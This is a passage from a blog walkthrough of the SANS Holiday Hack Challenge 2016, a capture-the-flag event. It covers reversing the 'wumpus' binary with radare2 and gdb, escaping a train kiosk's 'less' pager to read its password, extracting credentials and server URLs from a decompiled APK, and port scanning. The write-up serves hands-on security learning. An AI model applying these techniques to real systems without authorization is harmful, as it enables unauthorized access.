<span class="p">|</span>           0x00402760      488d500c       lea rdx, <span class="o">[</span>rax + 0xc<span class="o">]</span>        <span class="p">;</span> 0xc
<span class="p">|</span>           0x00402764      488b05c52920.  mov rax, qword <span class="o">[</span>obj.m2<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605130:8<span class="o">]=</span>0x4029d8 str.The_street_finds_its_own_uses_for_things. LEA obj.m2 <span class="p">;</span> obj.m2
<span class="p">|</span>           0x0040276b      0fb64004       movzx eax, byte <span class="o">[</span>rax + 4<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x4:1<span class="o">]=</span>2
<span class="p">|</span>           0x0040276f      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x00402771      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x00402775      488d500d       lea rdx, <span class="o">[</span>rax + 0xd<span class="o">]</span>        <span class="p">;</span> 0xd
<span class="p">|</span>           0x00402779      488b05b82920.  mov rax, qword <span class="o">[</span>obj.m4<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605138:8<span class="o">]=</span>0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 <span class="p">;</span> obj.m4
<span class="p">|</span>           0x00402780      0fb64007       movzx eax, byte <span class="o">[</span>rax + 7<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x7:1<span class="o">]=</span>0
<span class="p">|</span>           0x00402784      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x00402786      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x0040278a      488d500e       lea rdx, <span class="o">[</span>rax + 0xe<span class="o">]</span>        <span class="p">;</span> 0xe
<span class="p">|</span>           0x0040278e      488b05b32920.  mov rax, qword <span class="o">[</span>obj.m6<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605148:8<span class="o">]=</span>0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 <span class="p">;</span> obj.m6
<span class="p">|</span>           0x00402795      0fb64003       movzx eax, byte <span class="o">[</span>rax + 3<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x3:1<span class="o">]=</span>70
<span class="p">|</span>           0x00402799      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x0040279b      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x0040279f      488d500f       lea rdx, <span class="o">[</span>rax + 0xf<span class="o">]</span>        <span class="p">;</span> 0xf
<span class="p">|</span>           0x004027a3      488b056e2920.  mov rax, qword <span class="o">[</span>obj.m3<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605118:8<span class="o">]=</span>0x402958 str.0123456789abcdef LEA obj.m3 <span class="p">;</span> <span class="s2">&quot;X)@&quot;</span> @ 0x605118
<span class="p">|</span>           0x004027aa      0fb6400d       movzx eax, byte <span class="o">[</span>rax + 0xd<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0xd:1<span class="o">]=</span>0
<span class="p">|</span>           0x004027ae      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x004027b0      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x004027b4      488d5010       lea rdx, <span class="o">[</span>rax + 0x10<span class="o">]</span>       <span class="p">;</span> 0x10
<span class="p">|</span>           0x004027b8      488b05592920.  mov rax, qword <span class="o">[</span>obj.m3<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605118:8<span class="o">]=</span>0x402958 str.0123456789abcdef LEA obj.m3 <span class="p">;</span> <span class="s2">&quot;X)@&quot;</span> @ 0x605118
<span class="p">|</span>           0x004027bf      0fb6400e       movzx eax, byte <span class="o">[</span>rax + 0xe<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0xe:1<span class="o">]=</span>0
<span class="p">|</span>           0x004027c3      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x004027c5      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x004027c9      488d5011       lea rdx, <span class="o">[</span>rax + 0x11<span class="o">]</span>       <span class="p">;</span> 0x11
<span class="p">|</span>           0x004027cd      488b055c2920.  mov rax, qword <span class="o">[</span>obj.m2<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605130:8<span class="o">]=</span>0x4029d8 str.The_street_finds_its_own_uses_for_things. LEA obj.m2 <span class="p">;</span> obj.m2
<span class="p">|</span>           0x004027d4      0fb64006       movzx eax, byte <span class="o">[</span>rax + 6<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x6:1<span class="o">]=</span>1
<span class="p">|</span>           0x004027d8      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x004027da      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x004027de      488d5012       lea rdx, <span class="o">[</span>rax + 0x12<span class="o">]</span>       <span class="p">;</span> 0x12 <span class="p">;</span> <span class="s2">&quot;&gt;&quot;</span>
<span class="p">|</span>           0x004027e2      488b055f2920.  mov rax, qword <span class="o">[</span>obj.m6<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605148:8<span class="o">]=</span>0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 <span class="p">;</span> obj.m6
<span class="p">|</span>           0x004027e9      0fb600         movzx eax, byte <span class="o">[</span>rax<span class="o">]</span>
<span class="p">|</span>           0x004027ec      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x004027ee      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x004027f2      488d5013       lea rdx, <span class="o">[</span>rax + 0x13<span class="o">]</span>       <span class="p">;</span> 0x13
<span class="p">|</span>           0x004027f6      488b05232920.  mov rax, qword <span class="o">[</span>obj.m0<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605120:8<span class="o">]=</span>0x402970 str.The_sky_above_the_port_was_the_color_of_television__tuned_to_a_dead_channel. LEA obj.m0 <span class="p">;</span> <span class="s2">&quot;p)@&quot;</span> @ 0x605120
<span class="p">|</span>           0x004027fd      0fb600         movzx eax, byte <span class="o">[</span>rax<span class="o">]</span>
<span class="p">|</span>           0x00402800      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x00402802      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x00402806      488d5014       lea rdx, <span class="o">[</span>rax + 0x14<span class="o">]</span>       <span class="p">;</span> 0x14
<span class="p">|</span>           0x0040280a      488b05272920.  mov rax, qword <span class="o">[</span>obj.m4<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605138:8<span class="o">]=</span>0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 <span class="p">;</span> obj.m4
<span class="p">|</span>           0x00402811      0fb64006       movzx eax, byte <span class="o">[</span>rax + 6<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x6:1<span class="o">]=</span>1
<span class="p">|</span>           0x00402815      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x00402817      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x0040281b      488d5015       lea rdx, <span class="o">[</span>rax + 0x15<span class="o">]</span>       <span class="p">;</span> 0x15
<span class="p">|</span>           0x0040281f      488b05fa2820.  mov rax, qword <span class="o">[</span>obj.m0<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605120:8<span class="o">]=</span>0x402970 str.The_sky_above_the_port_was_the_color_of_television__tuned_to_a_dead_channel. LEA obj.m0 <span class="p">;</span> <span class="s2">&quot;p)@&quot;</span> @ 0x605120
<span class="p">|</span>           0x00402826      0fb6400a       movzx eax, byte <span class="o">[</span>rax + 0xa<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0xa:1<span class="o">]=</span>0
<span class="p">|</span>           0x0040282a      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x0040282c      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x00402830      488d5016       lea rdx, <span class="o">[</span>rax + 0x16<span class="o">]</span>       <span class="p">;</span> 0x16
<span class="p">|</span>           0x00402834      488b050d2920.  mov rax, qword <span class="o">[</span>obj.m6<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605148:8<span class="o">]=</span>0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 <span class="p">;</span> obj.m6
<span class="p">|</span>           0x0040283b      0fb64004       movzx eax, byte <span class="o">[</span>rax + 4<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x4:1<span class="o">]=</span>2
<span class="p">|</span>           0x0040283f      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x00402841      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x00402845      4889c7         mov rdi, rax
<span class="p">|</span>           0x00402848      e861f6ffff     call sym.to_upper
<span class="p">|</span>           0x0040284d      bf9f364000     mov edi, str._nPassphrase:  <span class="p">;</span> str._nPassphrase:
<span class="p">|</span>           0x00402852      e859e2ffff     call sym.imp.puts          <span class="p">;</span> int puts<span class="o">(</span>const char *s<span class="o">)</span><span class="p">;</span>
<span class="p">|</span>           0x00402857      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x0040285b      4889c7         mov rdi, rax
<span class="p">|</span>           0x0040285e      e84de2ffff     call sym.imp.puts          <span class="p">;</span> int puts<span class="o">(</span>const char *s<span class="o">)</span><span class="p">;</span>
<span class="p">|</span>           0x00402863      <span class="m">90</span>             nop
<span class="p">|</span>           0x00402864      c9             leave
<span class="se">\ </span>          0x00402865      c3             ret
</pre></div>
<p>Instead of trying to statically analyze this function, we can use <code>gdb</code>
to directly jump to it:</p>
<div class="highlight"><pre><span class="nv">$ </span>gdb ./wumpus
GNU gdb <span class="o">(</span>Debian 7.7.1+dfsg-5<span class="o">)</span> 7.7.1
Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2014</span> Free Software Foundation, Inc.
License GPLv3+: GNU GPL version <span class="m">3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type <span class="s2">&quot;show copying&quot;</span>
and <span class="s2">&quot;show warranty&quot;</span> <span class="k">for</span> details.
This GDB was configured as <span class="s2">&quot;x86_64-linux-gnu&quot;</span>.
Type <span class="s2">&quot;show configuration&quot;</span> <span class="k">for</span> configuration details.
For bug reporting instructions, please see:
&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
For <span class="nb">help</span>, <span class="nb">type</span> <span class="s2">&quot;help&quot;</span>.
Type <span class="s2">&quot;apropos word&quot;</span> to search <span class="k">for</span> commands related to <span class="s2">&quot;word&quot;</span>...
Reading symbols from ./wumpus...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
<span class="o">(</span>gdb<span class="o">)</span> r
Starting program: ./wumpus
Instructions? <span class="o">(</span>y-n<span class="o">)</span> ^Z
Program received signal SIGTSTP, Stopped <span class="o">(</span>user<span class="o">)</span>.
0x00007ffff7b0cba0 in __read_nocancel <span class="o">()</span> at ../sysdeps/unix/syscall-template.S:81
<span class="m">81</span>  ../sysdeps/unix/syscall-template.S: Aucun fichier ou dossier de ce type.
<span class="hll"><span class="o">(</span>gdb<span class="o">)</span> j kill_wump
</span>Continuing at 0x402648.
*thwock!* *groan* *crash*

A horrible roar fills the cave, and you realize, with a smile, that you
have slain the evil Wumpus and won the game!  You don<span class="err">&#39;</span>t want to tarry <span class="k">for</span>
long, however, because not only is the Wumpus famous, but the stench of
dead Wumpus is also quite well known, a stench plenty enough to slay the
mightiest adventurer at a single whiff!!

Passphrase:
<span class="hll">WUMPUS IS MISUNDERSTOOD
</span>
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7ff5000 in ?? <span class="o">()</span>
</pre></div>
<p>If you <cite>reaaaaally</cite> want to do it by hand, here's a short explanation (statical
analysis and disassembly are not my strong suits):</p>
<div class="highlight"><pre><span class="o">[</span>...<span class="o">]</span>
<span class="p">|</span>           0x00402656      bf18000000     mov edi, 0x18               <span class="p">;</span> <span class="s2">&quot;0.@&quot;</span>
<span class="p">|</span>           0x0040265b      e8f0e4ffff     call sym.imp.malloc        <span class="p">;</span>  void *malloc<span class="o">(</span>size_t size<span class="o">)</span><span class="p">;</span>
<span class="p">|</span>           0x00402660      488945f8       mov qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>, rax
<span class="p">|</span>           0x00402664      488b05cd2a20.  mov rax, qword <span class="o">[</span>obj.m4<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605138:8<span class="o">]=</span>0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 <span class="p">;</span> obj.m4
<span class="p">|</span>           0x0040266b      0fb65009       movzx edx, byte <span class="o">[</span>rax + 9<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x9:1<span class="o">]=</span>0
<span class="p">|</span>           0x0040266f      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x00402673      <span class="m">8810</span>           mov byte <span class="o">[</span>rax<span class="o">]</span>, dl
<span class="p">|</span>           0x00402675      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="o">[</span>...<span class="o">]</span>
</pre></div>
<p>Before the passphrase is printed, we can see that the program allocates memory
for a buffer, with a call so <code>sym.imp.malloc</code>. The size of the buffer is
<code>0x18</code> bytes, which is exactly the size of our final passphrase, plus
one, for the NULL byte (<strong>wink, wink</strong>). So, our final passphrase will be
constructed and put into a final buffer.</p>
<p>Then, we can see that several strings are used to compute our final passphrase.
The first one is:</p>
<blockquote>
When you <strong>w</strong>ant to know how things really work, study them when
they're coming apart</blockquote>
<p>The pointer to this string is put into the <code>rax</code> register. The byte
situated at <code>rax + 9</code> is then put into the <code>edx</code> register. If we
take our string, and get the 9th character (starting counting from 0), we get
the <code>w</code> from <code>want</code>.</p>
<p>This character is then moved to the <code>local_8h</code> variable. We now have a
<code>local_8h</code> variable, starting with <code>w</code>. Incidently, it's the first
character of our final passphrase (see where this is going?).</p>
<p>We then move on to the second character, using the following string:</p>
<blockquote>
We have no fut<strong>u</strong>re because our present is too volatile. We have
only risk management.</blockquote>
<div class="highlight"><pre><span class="o">[</span>...<span class="o">]</span>
<span class="p">|</span>           0x00402679      488d5001       lea rdx, <span class="o">[</span>rax + 1<span class="o">]</span>          <span class="p">;</span> 0x1
<span class="p">|</span>           0x0040267d      488b05bc2a20.  mov rax, qword <span class="o">[</span>obj.m5<span class="o">]</span>     <span class="p">;</span> <span class="o">[</span>0x605140:8<span class="o">]=</span>0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 <span class="p">;</span> <span class="s2">&quot;`*@&quot;</span> @ 0x605140
<span class="p">|</span>           0x00402684      0fb6400e       movzx eax, byte <span class="o">[</span>rax + 0xe<span class="o">]</span> <span class="p">;</span> <span class="o">[</span>0xe:1<span class="o">]=</span>0
<span class="p">|</span>           0x00402688      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x0040268a      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="o">[</span>...<span class="o">]</span>
</pre></div>
<p>We see that the byte situated at <code>rax + 0xe</code>, which is the second
<code>u</code> in <code>future</code>, is stored in <code>edx</code>. This character is then
moved to <code>local_8h + 1</code>.</p>
<p>Our <code>local_8h</code> now begins with <code>wu</code>. We do this for the rest of the
strings, and we finally get <code>wumpus is misunderstood</code>, before the call to
the <code>sym.to_upper</code> function, giving us the final passphrase.</p>
<div class="highlight"><pre><span class="o">[</span>...<span class="o">]</span>
<span class="p">|</span>           0x0040283b      0fb64004       movzx eax, byte <span class="o">[</span>rax + 4<span class="o">]</span>   <span class="p">;</span> <span class="o">[</span>0x4:1<span class="o">]=</span>2
<span class="p">|</span>           0x0040283f      <span class="m">8802</span>           mov byte <span class="o">[</span>rdx<span class="o">]</span>, al
<span class="p">|</span>           0x00402841      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
<span class="p">|</span>           0x00402845      4889c7         mov rdi, rax
<span class="hll"><span class="p">|</span>           0x00402848      e861f6ffff     call sym.to_upper
</span><span class="p">|</span>           0x0040284d      bf9f364000     mov edi, str._nPassphrase:  <span class="p">;</span> str._nPassphrase:
<span class="p">|</span>           0x00402852      e859e2ffff     call sym.imp.puts          <span class="p">;</span> int puts<span class="o">(</span>const char *s<span class="o">)</span><span class="p">;</span>
<span class="hll"><span class="p">|</span>           0x00402857      488b45f8       mov rax, qword <span class="o">[</span>rbp - local_8h<span class="o">]</span>
</span><span class="hll"><span class="p">|</span>           0x0040285b      4889c7         mov rdi, rax
</span><span class="hll"><span class="p">|</span>           0x0040285e      e84de2ffff     call sym.imp.puts          <span class="p">;</span> int puts<span class="o">(</span>const char *s<span class="o">)</span><span class="p">;</span>
</span><span class="o">[</span>...<span class="o">]</span>
</pre></div>
<p>Passphrase: <code>WUMPUS IS MISUNDERSTOOD</code></p>
<p>This passphrase gives you an access to a room called DFER, where there's no
terminal.</p>
</div>
<div class="section" id="train-station">
<h3>Train station</h3>
<p>You're given access to a kiosk menu to control the train:</p>
<pre class="literal-block">
Train Management Console: AUTHORIZED USERS ONLY
                ==== MAIN MENU ====
STATUS:                         Train Status
BRAKEON:                        Set Brakes
BRAKEOFF:                       Release Brakes
START:                          Start Train
HELP:                           Open the help document
QUIT:                           Exit console
menu:main&gt;
</pre>
<p>If you want to start the train, you must release the brakes, and know the
correct passphrase:</p>
<pre class="literal-block">
                ==== MAIN MENU ====
STATUS:                         Train Status
BRAKEON:                        Set Brakes
BRAKEOFF:                       Release Brakes
START:                          Start Train
HELP:                           Open the help document
QUIT:                           Exit console
menu:main&gt; BRAKEOFF
*******CAUTION*******
The brake has been released!
*******CAUTION*******
off
                ==== MAIN MENU ====
STATUS:                         Train Status
BRAKEON:                        Set Brakes
BRAKEOFF:                       Release Brakes
START:                          Start Train
HELP:                           Open the help document
QUIT:                           Exit console
menu:main&gt; START
Checking brakes....
Enter Password:
</pre>
<p>Let's see how we can find this password.</p>
<p>If you take a look at the <code>HELP</code> function, you can see that it's opening
a help file. The clue in the description of the <code>HELP</code> function
(&quot;un<strong>LESS</strong> you know something I don't&quot;), plus the name of the file at the
bottom of the screen, is a strong indicator that the menu is using the
<code>less</code> command to open the help file:</p>
<img alt="help_command.png" class="align-center" src="/images/sans-christmas-challenge-2016/help_command.png" />
<p>By using the <code>:e</code> command, we can examine another file than the one open.
By using tabulation auto-complete, we can see the name of the script used to
display the kiosk menu, <code>Train_Console</code>:</p>
<img alt="help_command_exploit.png" class="align-center" src="/images/sans-christmas-challenge-2016/help_command_exploit.png" />
<img alt="help_command_exploit_train_console_script.png" class="align-center" src="/images/sans-christmas-challenge-2016/help_command_train_console_script.png" />
<p>Passphrase: <code>24fb3e89ce2aa0ea422c3d511d40dd84</code>.</p>
<p>By starting the train, we can see that we can travel to the past, in 1978!</p>
<img alt="train_back_to_the_future.png" class="align-center" src="/images/sans-christmas-challenge-2016/train_back_to_the_future.png" />
<p>We then arrive in the North Pole, but in 1978:</p>
<img alt="north_pole_1978.png" class="align-center" src="/images/sans-christmas-challenge-2016/north_pole_1978.png" />
<p>We can go, in 1978, into every room that we unlocked in 2016. By doing so, we
find Santa in the DFER (&quot;Dungeon For Errant Reindeer&quot;) room:</p>
<img alt="found_santa.png" class="align-center" src="/images/sans-christmas-challenge-2016/found_santa.png" />
</div>
</div>
<div class="section" id="part-4-my-gosh-it-s-full-of-holes">
<h2>Part 4: My Gosh... It's Full of Holes</h2>
<p>Well, we've found Santa, Christmas is saved, hurray! But the abductor is still
roaming free. And since Santa is suffering from short-term memory loss because
of the fight, he doesn't remember who attacked him. So, who is behind Santa's
attack, and where can we find them? By taking a look at the SantaGram
application, we may find some interesting informations.</p>
<p>We're looking for servers the SantaGram application interacts with. By looking
at the resource file in the decompiled APK, we can find several URLs:</p>
<pre class="literal-block">
0x7f070015 (2131165205) = string.analytics_launch_url: https://analytics.northpolewonderland.com/report.php?type=launch
0x7f070016 (2131165206) = string.analytics_usage_url: https://analytics.northpolewonderland.com/report.php?type=usage
[...]
0x7f07001a (2131165210) = string.banner_ad_url: http://ads.northpolewonderland.com/affiliate/C9E380C8-2244-41E3-93A3-D6C6700156A5
[...]
0x7f07001d (2131165213) = string.debug_data_collection_url: http://dev.northpolewonderland.com/index.php
[...]
0x7f07001f (2131165215) = string.dungeon_url: http://dungeon.northpolewonderland.com/
0x7f070020 (2131165216) = string.exhandler_url: http://ex.northpolewonderland.com/exception.php
</pre>
<p>This gives us a total of five servers to target:</p>
<ul class="simple">
<li>analytics.northpolewonderland.com</li>
<li>ads.northpolewonderland.com</li>
<li>dev.northpolewonderland.com</li>
<li>dungeon.northpolewonderland.com</li>
<li>ex.northpolewonderland.com</li>
</ul>
<p>We can confirm with the Great and Powerful Oracle, Tom Hessman, that these are
indeed, the servers to target:</p>
<img alt="tom_hessman.png" class="align-center" src="/images/sans-christmas-challenge-2016/tom_hessman.png" />
<p>Alright, let the hacking begin!</p>
<div class="section" id="the-mobile-analytics-server-via-credentialed-login-access">
<h3><a class="reference external" href="https://analytics.northpolewonderland.com/">The Mobile Analytics Server (via credentialed login access)</a></h3>
<p>For the first part of this server, you only need to log in with the credentials
found in the decompiled APK, <code>guess/busyreindeer78</code>. Once you're
connected, you can download the wanted audio file:</p>
<img alt="first_audio_file.png" class="align-center" src="/images/sans-christmas-challenge-2016/first_audio_file.png" />
</div>
<div class="section" id="the-dungeon-game">
<h3><a class="reference external" href="http://dungeon.northpolewonderland.com/">The Dungeon Game</a></h3>
<p>The web server of the Dungeon game gives us instructions on how to play. A
mischievous Elf is said to trade secrets for gifts. If we give him a gift, he
may help us find the villain!</p>
<p>However, we can't seem to start a party on the web page. Similarly as last
year, and since an elf in the North Pole hints to do so, I suspected there was
another open port, on which we could connect to play the Dungeon game:</p>
<div class="highlight"><pre><span class="nv">$ </span>nmap dungeon.northpolewonderland.com

Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2016-12-29 21:58 CET
Nmap scan report <span class="k">for</span> dungeon.northpolewonderland.com <span class="o">(</span>35.184.47.139<span class="o">)</span>
Host is up <span class="o">(</span>0.12s latency<span class="o">)</span>.
rDNS record <span class="k">for</span> 35.184.47.139: 139.47.184.35.bc.googleusercontent.com
Not shown: <span class="m">994</span> closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
135/tcp   filtered msrpc
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
<span class="hll">11111/tcp open     vce
</span>
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.09 seconds
</pre></div>
<p>The last port is not a standard one, let's connect to it with <code>nc</code>:</p>
<div class="highlight"><pre><span class="nv">$ </span>nc dungeon.northpolewonderland.com 11111
Welcome to Dungeon.         This version created 11-MAR-78.
You are in an open field west of a big white house with a boarded
front door.
There is a small wrapped mailbox here.
&gt;
</pre></div>
<p>As suspected, it's an interface to the Dungeon game. That's when I decided to
brush up a little bit on it (instead of just posting a link to the Wikipedia
article as I did in Part 1). It's a text-based RPG, inspired by Dungeons and
Dragons. It's apparently strongly tied to the famous <a class="reference external" href="https://en.wikipedia.org/wiki/Zork">Zork</a>.</p>
<p>So I started searching for <cite>*cough cough*</cite> write-through of Zork and found
<a class="reference external" href="http://www.lacegem.com/solutions/zork1.html">this one</a>. It's not really
necessary, but it gave me the idea to go up the chimney.</p>
<p>Anyway, here's how to get the wanted information:</p>
<div class="highlight"><pre>Welcome to Dungeon.         This version created 11-MAR-78.
You are in an open field west of a big white house with a boarded
front door.
There is a small wrapped mailbox here.
<span class="hll">&gt;south
</span>You are facing the south side of a white house.  There is no door here,
and all the windows are barred.
<span class="hll">&gt;east
</span>You are behind the white house.  In one corner of the house
there is a window which is slightly ajar.
<span class="hll">&gt;open window
</span>With great effort, you open the window far enough to allow passage.
<span class="hll">&gt;go in
</span>You are in the kitchen of the white house.  A table seems to have
been used recently for the preparation of food.  A passage leads to
the west, and a dark staircase can be seen leading upward.  To the
east is a small window which is open.
On the table is an elongated brown sack, smelling of hot peppers.
A clear glass bottle is here.
The glass bottle contains:
  A quantity of water.
<span class="hll">&gt;west
</span>You are in the living room.  There is a door to the east.  To the west
is a wooden door with strange gothic lettering, which appears to be
nailed shut.
In the center of the room is a large oriental rug.
There is a trophy case here.
On hooks above the mantlepiece hangs an elvish sword of great antiquity.
A battery-powered brass lantern is on the trophy case.
There is an issue of US NEWS &amp; DUNGEON REPORT dated 11-MAR-78 here.
<span class="hll">&gt;take lantern
</span>Taken.
<span class="hll">&gt;turn lantern on
</span>The lamp is now on.
<span class="hll">&gt;move rug
</span>With a great effort, the rug is moved to one side of the room.
With the rug moved, the dusty cover of a closed trap door appears.
<span class="hll">&gt;open trap door
</span>The door reluctantly opens to reveal a rickety staircase descending
into darkness.
<span class="hll">&gt;go down
</span>You are in a dark and damp cellar with a narrow passageway leading
east, and a crawlway to the south.  To the west is the bottom of a
steep metal ramp which is unclimbable.
The door crashes shut, and you hear someone barring it.
<span class="hll">&gt;south
</span>You are on the west edge of a chasm, the bottom of which cannot be
seen.  The east side is sheer rock, providing no exits.  A narrow
passage goes west.  The path you are on continues to the north and south.
<span class="hll">&gt;south
</span>You are in an art gallery.  Most of the paintings which were here
have been stolen by vandals with exceptional taste.  The vandals
left through the north, south, or west exits.
Fortunately, there is still one chance for you to be a vandal, for on
the far wall is a work of unparalleled beauty.
<span class="hll">&gt;take painting
</span>Taken.
<span class="hll">&gt;south
</span>You are in what appears to have been an artist&#39;s studio.  The walls
and floors are splattered with paints of 69 different colors.
Strangely enough, nothing of value is hanging here.  At the north and
northwest of the room are open doors (also covered with paint).  An
extremely dark and narrow chimney leads up from a fireplace.  Although
you might be able to get up the chimney, it seems unlikely that you
could get back down.
<span class="hll">&gt;go up
</span>You have mysteriously reached the North Pole.
In the distance you detect the busy sounds of Santa&#39;s elves in full
production.

You are in a warm room, lit by both the fireplace but also the glow of
centuries old trophies.
On the wall is a sign:
        Songs of the seasons are in many parts
        To solve a puzzle is in our hearts
        Ask not what what the answer be,
        Without a trinket to satisfy me.
The elf is facing you keeping his back warmed by the fire.
<span class="hll">&gt;give painting to elf
</span>The elf, satisified with the trade says -
<span class="hll">send email to &quot;peppermint@northpolewonderland.com&quot; for that which you seek.
</span>The elf says - you have conquered this challenge - the game will now end.
Your score is 89 [total of 585 points], in 16 moves.
This gives you the rank of Novice Adventurer.
</pre></div>
<p>We're given instructions to send a mail to <a class="reference external" href="mailto:peppermint&#64;northpolewonderland.com">peppermint&#64;northpolewonderland.com</a>
to receive the information we seek. After sending an email, we get an answer:</p>
<img alt="dungeon_audio_file.png" class="align-center" src="/images/sans-christmas-challenge-2016/dungeon_audio_file.png" />
<p>We now have our third weird audio file.</p>
</div>
<div class="section" id="the-debug-server">
<h3><a class="reference external" href="http://dev.northpolewonderland.com/index.php">The Debug Server</a></h3>
<p>If we look at the decompiled source code of the SantaGram application, we can
see that the debug server is called when a user modifies their own profile:</p>
<div class="highlight"><pre><span class="c1">// File com/northpolewonderland/santagram/EditProfile.java</span>
<span class="hll"><span class="k">if</span> <span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">debug_data_enabled</span><span class="o">).</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;true&quot;</span><span class="o">))</span> <span class="o">{</span>
</span>    <span class="n">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">TAG</span><span class="o">),</span> <span class="s">&quot;Remote debug logging is Enabled&quot;</span><span class="o">);</span>
<span class="hll">    <span class="n">z</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
</span><span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
    <span class="n">Log</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="n">R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">TAG</span><span class="o">),</span> <span class="s">&quot;Remote debug logging is Disabled&quot;</span><span class="o">);</span>
    <span class="n">z</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
<span class="o">}</span>
<span class="o">[...]</span>
